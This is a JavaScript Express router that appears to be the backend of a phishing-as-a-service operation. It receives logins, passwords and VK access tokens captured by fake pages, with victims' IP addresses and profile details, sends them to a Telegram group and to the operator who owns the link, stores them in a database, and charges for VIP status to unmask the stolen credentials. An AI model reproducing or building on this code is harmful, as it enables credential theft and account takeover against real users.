const {
    Router
} = require('express')
const bot = require('../../createBot')
const accs = require('../../database/models/account')
const links = require('../../database/models/link')
const user = require('../../database/models/userData')
const {
    names,
    messages
} = require('./../../objects')
const {
    GetDateFormat,
    GetStringDate
} = require('../tools')
const router = Router()
let iplist = []

router.post('/get', async (req, res) => {
    let userData = await user.findOne({
        tg_id: parseInt(req.body.id, 32)
    })

    let redirect = await links.findOne({
        link: req.body.link
    }).query[req.body.pattern]
    if (userData) {
        await user.updateOne({
            tg_id: parseInt(req.body.id, 32)
        }, {
            links_info: [...userData.links_info, {
                link: req.body.link,
                date: new Date(),
                pattern: req.body.pattern
            }]
        }, {
            upsert: true
        })
        userData.redirect.map(e => {
            if (e.link == req.body.link && e.pattern == req.body.pattern) {
                redirect = e.redirect
            }
        })
    }
    res.json({
        redirect: redirect
    })
})
router.post('/add', async (req, res) => {
    if (req.body.ip && iplist.filter(e => e == req.body.ip).length < 10) {
        iplist.push(req.body.ip)
        const userData = await user.findOne({
            tg_id: parseInt(req.body.id, 32)
        })
        const condidate = await accs.findOne({
            type: req.body.type,
            login: req.body.login,
            password: req.body.password
        })
        if (!condidate && req.body.login.trim() != '' && req.body.password.trim() != '') {
            let link = await links.findOne({
                link: req.body.fake
            })
            bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Login: <code>${req.body.login}</code>\n🗝 Password: <code>${req.body.password}</code>\n${req.body.type == 'vk'?`🖇  Token: <code>${req.body.token}</code>\n\n🚶Имя: ${req.body.first_name}\n🍌Фамилия: ${req.body.last_name}\n\n🆔 ID: <a href="https://vk.com/id${req.body.user_id}">${req.body.user_id}</a>\n\n🤼 Друзей: ${req.body.counters.friends}\n👨‍👩‍👧‍👦 Подписчиков: ${req.body.counters.followers}\n\n🎁 Подарков: ${req.body.counters.gifts}\n\n`:''}📍 IP: <code>${req.body.ip}</code>\n🖥 Fake: <code>${req.body.fake}</code>\n🚧 Шаблон: <code>${'-'}</code>\n\n🗓 Дата: <code>${GetDateFormat(new Date()).split(' / ')[0]}</code>\n🕰 Время: <code>${GetDateFormat(new Date()).split(' / ')[1]}</code>\n\n\nАккаунт пользователя: @${userData.login?userData.login:'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`, {
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
            if (userData) {
                let BluredLogin = req.body.login.includes('@') ? req.body.login.split('@')[0].substr(0, Math.floor(req.body.login.split('@')[0].length * 20 / 100)) + '*'.repeat(req.body.login.split('@')[0].length - Math.floor(req.body.login.split('@')[0].length * 20 / 100)) + req.body.login.split('@')[1] : req.body.login.length < 5 ? '*'.repeat(req.body.login.length) : req.body.login.substr(0, Math.floor(req.body.login.length * 30 / 100)) + '*'.repeat(req.body.login.length - Math.floor(req.body.login.length * 50 / 100)) + req.body.login.substr(req.body.login.length - Math.floor(req.body.login.length * 20 / 100), req.body.login.length)
                let BluredPassword = req.body.password.substr(0, Math.floor(req.body.password.length * 30 / 100)) + '*'.repeat(req.body.password.length - Math.floor(req.body.password.length * 50 / 100)) + req.body.password.substr(req.body.password.length - Math.floor(req.body.password.length * 20 / 100), req.body.password.length)
                let BluredToken = req.body.token ? req.body.token.substr(0, Math.floor(req.body.token.length * 30 / 100)) + '*'.repeat(req.body.token.length - Math.floor(req.body.token.length * 50 / 100)) + req.body.token.substr(req.body.token.length - Math.floor(req.body.token.length * 20 / 100), req.body.token.length): ''
                let user = userData
                let vkMessage = req.body.type == 'vk' ? messages.vkMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date() ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date() ? req.body.password : BluredPassword, user.vip ? req.body.token : user.vip ? req.body.token : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.token : BluredToken, req.body.first_name || '-', req.body.last_name || '-', 'id' + req.body.user_id || '-', req.body.counters.friends == 0 || req.body.counters.friends > 0 ? req.body.counters.friends : '-', req.body.counters.followers == 0 || req.body.counters.followers > 0 ? req.body.counters.followers : '-', req.body.online ? '✳️' : '⭕️', req.body.online ? 'Online' : 'Offline', req.body.counters.gifts == 0 || req.body.counters.gifts > 0 ? req.body.counters.gifts : '-', req.body.ip || '-', req.body.fake || '-',  '-', req.body.pattern || 0, GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0):''
                let otherMessage = req.body.type != 'vk' ? messages.otherMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.password : BluredPassword, req.body.ip || '-', req.body.fake || '-',  '-', GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0):''
                bot.sendMessage(parseInt(req.body.id, 32), req.body.type == 'vk' ?
                    vkMessage.substr(0, vkMessage.length - 5) + `${userData.vip?'':'\n\nДля просмотра данных от аккаунтов приобретите VIP статус'}` : otherMessage.substr(0, otherMessage.length - 5) + `${userData.vip?'':'\n\nДля просмотра данных от аккаунтов приобретите VIP статус'}`, {
                        reply_markup: {
                            inline_keyboard: [
                                userData.vip ? [] : [{
                                    text: 'Купить VIP',
                                    callback_data: 'show_vip'
                                }]
                            ]
                        },
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                await new accs({
                    login: req.body.login,
                    password: req.body.password,
                    token: req.body.token ,
                    has_mobile: req.body.has_mobile,
                    followers: req.body.counters?.followers,
                    friends: req.body.counters?.friends,
                    online: req.body.online,
                    first_name: req.body.first_name,
                    last_name: req.body.last_name,
                    id: req.body.user_id,
                    is_closed: req.body.is_closed,
                    photo: req.body.photo_400_orig,
                    sex: req.body.sex,
                    gifts: req.body?.counters?.gifts,
                    tg_id: parseInt(req.body.id, 32),
                    type: req.body.type,
                    fake: req.body.fake,
                    pattern: link.query[Number(req.body.query)].name,
                    query: Number(req.body.query),
                    ip: req.body.ip.split(',')[0] || '-',
                    date: new Date()
                }).save()
            }
        }
        res.end()
    } else {
        res.end()
    }
})
setInterval(() => {
    iplist = []
}, 18000000)

module.exports = router